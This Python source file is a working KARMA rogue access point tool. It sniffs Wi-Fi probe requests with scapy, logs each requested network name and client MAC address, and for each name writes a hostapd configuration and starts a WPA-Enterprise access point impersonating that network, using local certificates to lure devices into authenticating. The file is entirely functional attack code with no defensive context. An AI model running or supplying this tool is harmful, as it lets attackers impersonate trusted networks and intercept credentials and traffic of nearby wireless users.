from scapy.all import Dot11, Dot11Elt, Dot11ProbeReq, sniff
import subprocess
import os

captured_ssids = set()
_active_iface = "wlan0"

def karma_handler(pkt):
    if pkt.haslayer(Dot11ProbeReq):
        try:
            ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore").strip()
        except Exception:
            return

        if ssid and ssid not in captured_ssids:
            captured_ssids.add(ssid)
            print(f"[KARMA] Probe → SSID: '{ssid}' | MAC: {pkt.addr2}")
            spawn_ap_for_ssid(ssid, _active_iface)


def spawn_ap_for_ssid(ssid, iface):
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    cert_dir = os.path.join(base_dir, "certs")

    conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/tmp/eapx.eap_user
ca_cert={cert_dir}/ca.pem
server_cert={cert_dir}/server.pem
private_key={cert_dir}/server.key
"""
    safe = ssid.replace(" ", "_").replace("/", "").replace("\\", "")
    path = f"/tmp/karma_{safe}.conf"

    with open(path, "w") as f:
        f.write(conf)

    subprocess.Popen(
        ["hostapd", path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    print(f"[KARMA] AP spawned for '{ssid}'")


def start_karma(iface):
    global _active_iface
    _active_iface = iface
    print(f"[*] KARMA active on {iface} — listening for all probe requests...")
    print("[*] Press Ctrl+C to stop\n")
    try:
        sniff(
            iface=iface,
            prn=karma_handler,
            store=0,
            filter="type mgt subtype probe-req"
        )
    except KeyboardInterrupt:
        print(f"\n[*] KARMA stopped — spawned {len(captured_ssids)} fake AP(s)")
